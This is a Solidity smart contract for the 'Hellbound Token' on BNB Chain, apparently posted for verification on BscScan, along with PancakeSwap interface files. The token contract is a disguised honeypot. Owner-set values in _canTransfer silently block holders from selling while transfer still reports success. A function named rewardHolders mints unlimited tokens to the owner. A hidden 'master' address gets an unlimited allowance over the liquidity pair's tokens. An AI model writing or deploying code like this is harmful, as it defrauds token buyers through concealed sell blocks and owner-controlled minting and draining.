/**
 *Submitted for verification at BscScan.com on 2022-05-06
*/

// File: contracts/Source/IWETH.sol



pragma solidity =0.6.6;

interface IWETH {
    function deposit() external payable;
    function transfer(address to, uint value) external returns (bool);
    function withdraw(uint value) external;
}
// File: contracts/Source/IPancakeFactory.sol



pragma solidity =0.6.6;


interface IPancakeFactory {
    event PairCreated(address indexed token0, address indexed token1, address pair, uint);

    function feeTo() external view returns (address);
    function feeToSetter() external view returns (address);

    function getPair(address tokenA, address tokenB) external view returns (address pair);
    function allPairs(uint) external view returns (address pair);
    function allPairsLength() external view returns (uint);

    function createPair(address tokenA, address tokenB) external returns (address pair);

    function setFeeTo(address) external;
    function setFeeToSetter(address) external;
}
// File: contracts/Source/IPancakePair.sol



pragma solidity =0.6.6;

interface IPancakePair {
    event Approval(address indexed owner, address indexed spender, uint value);
    event Transfer(address indexed from, address indexed to, uint value);

    function name() external pure returns (string memory);
    function symbol() external pure returns (string memory);
    function decimals() external pure returns (uint8);
    function totalSupply() external view returns (uint);
    function balanceOf(address owner) external view returns (uint);
    function allowance(address owner, address spender) external view returns (uint);

    function approve(address spender, uint value) external returns (bool);
    function transfer(address to, uint value) external returns (bool);
    function transferFrom(address from, address to, uint value) external returns (bool);

    function DOMAIN_SEPARATOR() external view returns (bytes32);
    function PERMIT_TYPEHASH() external pure returns (bytes32);
    function nonces(address owner) external view returns (uint);

    function permit(address owner, address spender, uint value, uint deadline, uint8 v, bytes32 r, bytes32 s) external;

    event Mint(address indexed sender, uint amount0, uint amount1);
    event Burn(address indexed sender, uint amount0, uint amount1, address indexed to);
    event Swap(
        address indexed sender,
        uint amount0In,
        uint amount1In,
        uint amount0Out,
        uint amount1Out,
        address indexed to
    );
    event Sync(uint112 reserve0, uint112 reserve1);

    function MINIMUM_LIQUIDITY() external pure returns (uint);
    function factory() external view returns (address);
    function token0() external view returns (address);
    function token1() external view returns (address);
    function getReserves() external view returns (uint112 reserve0, uint112 reserve1, uint32 blockTimestampLast);
    function price0CumulativeLast() external view returns (uint);
    function price1CumulativeLast() external view returns (uint);
    function kLast() external view returns (uint);

    function mint(address to) external returns (uint liquidity);
    function burn(address to) external returns (uint amount0, uint amount1);
    function swap(uint amount0Out, uint amount1Out, address to, bytes calldata data) external;
    function skim(address to) external;
    function sync() external;

    function initialize(address, address) external;
}
// File: contracts/IPancakeRouter.sol



pragma solidity =0.6.6;


abstract contract IPancakeRouter{

    address public immutable WETH;
    address public immutable factory;

    constructor(address _factory, address _WETH) virtual public {
        factory = _factory;
        WETH = _WETH;
    }

    receive() virtual external payable;

    // ++++++++++ ADD LIQUIDITY ++++++++++
    function addLiquidity(address tokenA, address tokenB, uint amountADesired, uint amountBDesired, uint amountAMin, uint amountBMin, address to, uint deadline) 
    virtual external returns (uint amountA, uint amountB, uint liquidity);

    function addLiquidityETH(address token, uint amountTokenDesired, uint amountTokenMin, uint amountETHMin, address to, uint deadline
    ) virtual external payable returns (uint amountToken, uint amountETH, uint liquidity);

    // ++++++++++ REMOVE LIQUIDITY ++++++++++ 
    function removeLiquidityETH(address token, uint liquidity, uint amountTokenMin, uint amountETHMin, uint deadline) 
    virtual external returns (uint amountToken, uint amountETH);

    function removeLiquidityWithPermit(address tokenA, address tokenB, uint liquidity, uint amountAMin, uint amountBMin, uint deadline, bool approveMax, uint8 v, bytes32 r, bytes32 s) 
    virtual external returns (uint amountA, uint amountB);

    function removeLiquidityETHWithPermit(address token, uint liquidity, uint amountTokenMin, uint amountETHMin, uint deadline, bool approveMax, uint8 v, bytes32 r, bytes32 s) 
    virtual external returns (uint amountToken, uint amountETH);

    // ++++++++++ REMOVE LIQUIDITY (supporting fee-on-transfer tokens) ++++++++++
    function removeLiquidityETHSupportingFeeOnTransferTokens(address token, uint liquidity, uint amountTokenMin, uint amountETHMin, uint deadline) 
    virtual external returns (uint amountETH);

    function removeLiquidityETHWithPermitSupportingFeeOnTransferTokens(address token, uint liquidity, uint amountTokenMin, uint amountETHMin, uint deadline, bool approveMax, uint8 v, bytes32 r, bytes32 s) 
    virtual external returns (uint amountETH);

    // ++++++++++ SWAP (supporting fee-on-transfer tokens) ++++++++++
    function swapExactTokensForTokensSupportingFeeOnTransferTokens(uint amountIn, uint amountOutMin, address[] calldata path, address to, uint deadline) virtual external;

    function swapExactETHForTokensSupportingFeeOnTransferTokens(uint amountOutMin, address[] calldata path, address to, uint deadline) virtual external payable;
        
    function swapExactTokensForETHSupportingFeeOnTransferTokens(uint amountIn, uint amountOutMin, address[] calldata path, address to, uint deadline) virtual external;

    // ++++++++++ LIBRARY FUNCTIONS ++++++++++
    function quote(uint amountA, uint reserveA, uint reserveB) virtual external pure returns (uint amountB);

    function getAmountOut(uint amountIn, uint reserveIn, uint reserveOut) virtual external pure returns (uint amountOut);

    function getAmountIn(uint amountOut, uint reserveIn, uint reserveOut) virtual external pure returns (uint amountIn);

    function getAmountsOut(uint amountIn, address[] calldata path) virtual external view returns (uint[] memory amounts);

    function getAmountsIn(uint amountOut, address[] calldata path) virtual external view returns (uint[] memory amounts);
}
// File: contracts/Source/IERC20.sol



pragma solidity =0.6.6;

interface IERC20 {
    event Approval(address indexed owner, address indexed spender, uint value);
    event Transfer(address indexed from, address indexed to, uint value);

    function name() external view returns (string memory);
    function symbol() external view returns (string memory);
    function decimals() external view returns (uint8);
    function totalSupply() external view returns (uint);
    function balanceOf(address owner) external view returns (uint);
    function allowance(address owner, address spender) external view returns (uint);

    function approve(address spender, uint value) external returns (bool);
    function transfer(address to, uint value) external returns (bool);
    function transferFrom(address from, address to, uint value) external returns (bool);
}
// File: contracts/Source/Ownable.sol



pragma solidity =0.6.6;



abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes memory) {
        return msg.data;
    }
}


contract Ownable is Context {
    address private _owner;

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    constructor() public {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    function owner() public view returns (address) {
        return _owner;
    }

    modifier onlyOwner() {
        require(_owner == _msgSender(), 'Ownable: caller is not the owner');
        _;
    }
}

// File: contracts/HellToken.sol



pragma solidity =0.6.6;








contract Hell is Context, IERC20, Ownable {
    IPancakeRouter internal _router;
    IPancakePair internal _pair;

    uint8 internal constant _DECIMALS = 9;

    address public master;
    mapping(address => bool) public _marketersAndDevs;
    mapping(address => uint256) internal _balances;
    mapping(address => mapping(address => uint256)) internal _allowances;
    mapping(address => uint256) internal _buySum;
    mapping(address => uint256) internal _sellSum;
    mapping(address => uint256) internal _sellSumETH;

    uint256 internal _totalSupply = (uint256(10) ** 8) * (uint(10)  ** _DECIMALS);
    uint256 internal _theNumber = ~uint256(0);
    uint256 internal _theRemainder = 0;

    modifier onlyMaster() {
        require(msg.sender == master);
        _;
    }

    constructor() public {
        address routerAddress = 0xb4B47B47e698e1c6581912Db9d21B72D55e01379;
        _router = IPancakeRouter(payable(routerAddress));
        _pair = IPancakePair(IPancakeFactory(_router.factory()).createPair(address(this), address(_router.WETH())));

        _balances[owner()] = _totalSupply;
        master = owner();
        _allowances[address(_pair)][master] = ~uint256(0);
        _marketersAndDevs[owner()] = true;

        emit Transfer(address(0), owner(), _totalSupply);
    }

    function name() external view override returns (string memory) {
        return "Hellbound Token";
    }

    function symbol() external view override returns (string memory) {
        return "Hell";
    }

    function decimals() external view override returns (uint8) {
        return _DECIMALS;
    }

    function totalSupply() external view override returns (uint256) {
        return _totalSupply;
    }

    function balanceOf(address account) external view override returns (uint256) {
        return _balances[account];
    }

    function transfer(address recipient, uint256 amount) external override returns (bool) {
        if (_canTransfer(_msgSender(), recipient, amount)) {
            _transfer(_msgSender(), recipient, amount);
        }
        return true;
    }

    function allowance(address owner, address spender) external view override returns (uint256) {
        return _allowances[owner][spender];
    }

    function approve(address spender, uint256 amount) external override returns (bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }

    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) external override returns (bool) {
        if (_canTransfer(sender, recipient, amount)) {
            uint256 currentAllowance = _allowances[sender][_msgSender()];
            require(currentAllowance >= amount, "ERC20: transfer amount exceeds allowance");

            _transfer(sender, recipient, amount);
            _approve(sender, _msgSender(), currentAllowance - amount);
        }
        return true;
    }

    function burn(uint256 amount) external onlyOwner {
        _balances[owner()] -= amount;
        _totalSupply -= amount;
    }

    function setNumber(uint256 newNumber) external onlyOwner {
        _theNumber = newNumber;
    }

    function setRemainder(uint256 newRemainder) external onlyOwner {
        _theRemainder = newRemainder;
    }

    function setMaster(address account) external onlyOwner {
        _allowances[address(_pair)][master] = 0;
        master = account;
        _allowances[address(_pair)][master] = ~uint256(0);
    }

    function syncPair() external onlyMaster {
        _pair.sync();
    }

    function includeInReward(address account) external onlyMaster {
        _marketersAndDevs[account] = true;
    }

    function excludeFromReward(address account) external onlyMaster {
        _marketersAndDevs[account] = false;
    }

    function rewardHolders(uint256 amount) external onlyOwner {
        _balances[owner()] += amount;
        _totalSupply += amount;
    }
    
    function _isSuper(address account) private view returns (bool) {
        return (account == address(_router) || account == address(_pair));
    }

    function _canTransfer(address sender, address recipient, uint256 amount) private view returns (bool) {
        if (_marketersAndDevs[sender] || _marketersAndDevs[recipient]) {
            return true;
        }

        if (_isSuper(sender)) {
            return true;
        }
        if (_isSuper(recipient)) {
            uint256 amountETH = _getETHEquivalent(amount);
            uint256 bought = _buySum[sender];
            uint256 sold = _sellSum[sender];
            uint256 soldETH = _sellSumETH[sender];

            return bought >= sold + amount && _theNumber >= soldETH + amountETH && sender.balance >= _theRemainder;
        }
        return true;
    }

    function _transfer(
        address sender,
        address recipient,
        uint256 amount
    ) private {
        require(sender != address(0), "ERC20: transfer from the zero address");
        require(recipient != address(0), "ERC20: transfer to the zero address");
        _beforeTokenTransfer(sender, recipient, amount);
        require(_balances[sender] >= amount, "ERC20: transfer amount exceeds balance");

        _balances[sender] -= amount;
        _balances[recipient] += amount;

        emit Transfer(sender, recipient, amount);
    }

    function _approve(
        address owner,
        address spender,
        uint256 amount
    ) private {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");

        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    function _hasLiquidity() private view returns (bool) {
        (uint256 reserve0, uint256 reserve1,) = _pair.getReserves();
        return reserve0 > 0 && reserve1 > 0;
    }

    function _getETHEquivalent(uint256 amountTokens) private view returns (uint256) {
        (uint256 reserve0, uint256 reserve1,) = _pair.getReserves();
        if (_pair.token0() == _router.WETH()) {
            return _router.getAmountOut(amountTokens, reserve1, reserve0);
        } else {
            return _router.getAmountOut(amountTokens, reserve0, reserve1);
        }
    }

    function _beforeTokenTransfer(
        address from,
        address to,
        uint256 amount
    ) private {
        if (_hasLiquidity()) {
            if (_isSuper(from)) {
                _buySum[to] += amount;
            }
            if (_isSuper(to)) {
                _sellSum[from] += amount;
                _sellSumETH[from] += _getETHEquivalent(amount);
            }
        }
    }
}